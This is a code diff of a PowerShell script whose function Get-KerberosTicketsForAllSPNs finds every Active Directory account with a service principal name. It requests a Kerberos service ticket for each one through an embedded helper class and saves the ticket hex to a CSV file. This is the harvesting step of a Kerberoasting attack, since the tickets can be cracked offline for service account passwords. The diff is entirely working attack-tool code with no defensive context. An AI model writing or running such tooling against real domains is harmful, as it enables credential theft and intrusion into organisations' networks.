@@ -121,61 +121,47 @@ public class K {
 "@
 
 function Get-KerberosTicketsForAllSPNs {
-    [CmdletBinding()]
-    Param(
-        [switch]$ExportToCsv,
-        [string]$CsvPath = ".\KerberosTickets.csv"
+    param (
+        [switch] $ExportToCsv
     )
 
-    Write-Host "Requesting TGS for SPNs:" -ForegroundColor Cyan
+    Write-Host "`nRequesting TGS for SPNs:`n" -ForegroundColor Cyan
 
-    $searcher = [ADSISearcher]"(&(samAccountType=805306368)(servicePrincipalName=*))"
-    $searcher.PageSize = 1000
-    $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
-    $searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
+    # Get all user and computer accounts with SPNs
+    $accounts = @()
+    try {
+        $accounts += Get-ADUser -Filter { ServicePrincipalName -like "*" } -Properties ServicePrincipalName
+    } catch { Write-Warning "Failed to query users with SPNs: $_" }
 
     try {
-        $results = $searcher.FindAll()
-    } catch {
-        Write-Error "Failed to query Active Directory: $_"
-        return
-    }
+        $accounts += Get-ADComputer -Filter { ServicePrincipalName -like "*" } -Properties ServicePrincipalName
+    } catch { Write-Warning "Failed to query computers with SPNs: $_" }
 
-    if ($results -and $results -is [System.Collections.IEnumerable]) {
-        $output = @()
+    $results = foreach ($acct in $accounts) {
+        foreach ($spn in $acct.ServicePrincipalName) {
+            Write-Host " -> $spn"
+            $ticket = ""
+            try {
+                $ticket = [K]::GetTicket($spn)
+            } catch {
+                Write-Warning "Failed to request ticket for $spn: $_"
+            }
 
-        foreach ($r in $results) {
-            $spns = $r.Properties["servicePrincipalName"]
-            $user = $r.Properties["samAccountName"]
-
-            foreach ($spn in $spns) {
-                Write-Host "`n[$user] $spn" -ForegroundColor Green
-
-                try {
-                    $ticket = [K]::GetTicket($spn)
-                    if ($ticket) {
-                        $obj = [PSCustomObject]@{
-                            SamAccountName = $user
-                            SPN            = $spn
-                            TicketHex      = $ticket
-                        }
-                        $output += $obj
-                    } else {
-                        Write-Warning "No ticket retrieved for $spn"
-                    }
-                } catch {
-                    Write-Warning "Failed to get ticket for $spn: $_"
-                }
+            [pscustomobject]@{
+                Name        = $acct.Name
+                SamAccount  = $acct.SamAccountName
+                ObjectClass = $acct.objectClass
+                SPN         = $spn
+                TicketHex   = $ticket
             }
         }
+    }
 
-        if ($ExportToCsv -and $output.Count -gt 0) {
-            $output | Export-Csv -Path $CsvPath -NoTypeInformation -Force
-            Write-Host "`nSaved to: $CsvPath" -ForegroundColor Yellow
-        }
-
-        return $output
+    if ($ExportToCsv) {
+        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+        $results | Export-Csv "Kerberos_Tickets_$timestamp.csv" -NoTypeInformation
+        Write-Host "`nSaved tickets to Kerberos_Tickets_$timestamp.csv" -ForegroundColor Green
     } else {
-        Write-Warning "LDAP query returned no usable results. AD may be unreachable or .NET config is broken."
+        return $results
     }
 }
